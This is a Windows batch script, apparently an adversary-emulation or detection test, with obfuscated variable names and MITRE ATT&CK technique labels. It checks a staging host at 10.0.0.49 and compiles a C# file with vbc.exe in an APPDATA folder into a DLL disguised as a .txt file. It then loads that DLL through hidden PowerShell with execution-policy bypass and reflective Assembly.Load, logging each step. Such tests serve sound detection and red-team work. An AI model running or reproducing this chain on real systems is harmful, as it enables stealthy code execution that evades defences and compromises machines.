@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET recnn=%APPDATA%\7640\0242fe3e
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?7640-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=expressvp.txt
SET njozco=file.txt
SET kkjwr=7640

REM Generated random variables
SET dsdvhh=%APPDATA%\!ufeybybm!\macula-simulations.log
SET cfgnvf=vbc.exe
SET vbdax=%APPDATA%\!ufeybybm!
SET jhfqcd=powershell.exe
SET yhjw=1
SET wswgok=0
SET msdfge=
SET qmnmq=
SET frtygf=0
SET bnmtr=1

REM Step 1: Check server availability
curl -k -s -o nul !uouoq!
IF !ERRORLEVEL! EQU 0 (
    SET frtygf=!bnmtr!
    SET qmnmq=
) ELSE (
    SET frtygf=!wswgok!
    SET qmnmq=connection_refused
)
SET msdfge=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!
echo [!msdfge!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1105|Ingress_Tool_Transfer=!frtygf!:!qmnmq! >> !dsdvhh! 2>nul || REM

REM Step 2: Change directory
cd /d "!recnn!" >nul 2>&1

REM Step 3: Compile DLL with T1500 logging
IF EXIST "!njozco!" (
    "!cfgnvf!" /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        SET frtygf=!bnmtr!
        SET qmnmq=
    ) ELSE (
        SET frtygf=!wswgok!
        SET qmnmq=compilation_error
    )
) ELSE (
    SET frtygf=!wswgok!
    SET qmnmq=source_not_found
)
SET msdfge=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!
echo [!msdfge!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile_After_Delivery=!frtygf!:!qmnmq! >> !dsdvhh! 2>nul || REM

REM Step 4: Execute with T1218 logging (only if compilation succeeded)
IF EXIST "!hpnjatpj!" IF !frtygf! EQU !bnmtr! (
    "!jhfqcd!" -nop -w hidden -ep bypass -Command "& { [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('!hpnjatpj!')).EntryPoint.Invoke($null, @(,[string[]]@())) }" >nul 2>&1
    IF !ERRORLEVEL! EQU 0 (
        SET frtygf=!bnmtr!
        SET qmnmq=
    ) ELSE (
        SET frtygf=!wswgok!
        SET qmnmq=assembly_load_failed
    )
    SET msdfge=!DATE:~-4!-!DATE:~3,2!-!DATE:~0,2! !TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~9,2!
    echo [!msdfge!][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|Signed_Binary_Proxy_Execution=!frtygf!:!qmnmq! >> !dsdvhh! 2>nul || REM
)

ENDLOCAL